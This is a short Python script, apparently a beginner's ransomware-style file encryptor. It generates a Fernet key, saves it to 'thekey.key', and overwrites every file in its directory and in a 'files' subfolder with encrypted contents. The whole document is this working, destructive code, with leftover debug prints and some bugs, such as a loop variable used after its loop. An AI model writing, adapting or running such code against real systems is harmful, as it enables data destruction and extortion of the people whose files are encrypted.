import os
from cryptography.fernet import Fernet

files = []
folders=[]
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
for file in os.listdir():
    if file == "main.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)
    else:
        if file == "files":
            folders.append(file)

for folder in folders:
    if folder == "files":
        os.chdir(os.path.join(os.path.dirname(__file__), folder))
        for file in os.listdir():
            print(os.getcwd())
            print(file)
            files.append(file)
os.chdir(os.path.join(os.path.dirname(__file__), "."))
print(os.getcwd())
print("files", files)
print(folders)
for file in os.listdir():
    for filel in files:
        if file==filel:
            with open(file, "rb") as the_file:
                contents = the_file.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as the_file:
                 the_file.write(contents_encrypted)
os.chdir(os.path.join(os.path.dirname(__file__), folder))
print(os.getcwd())

for file in os.listdir():
    print(file)
    for filel in files:
        if file == filel:
            print("entra")
            with open(file, "rb") as the_file:
                print(contents)
                contents = the_file.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as the_file:
                 the_file.write(contents_encrypted)

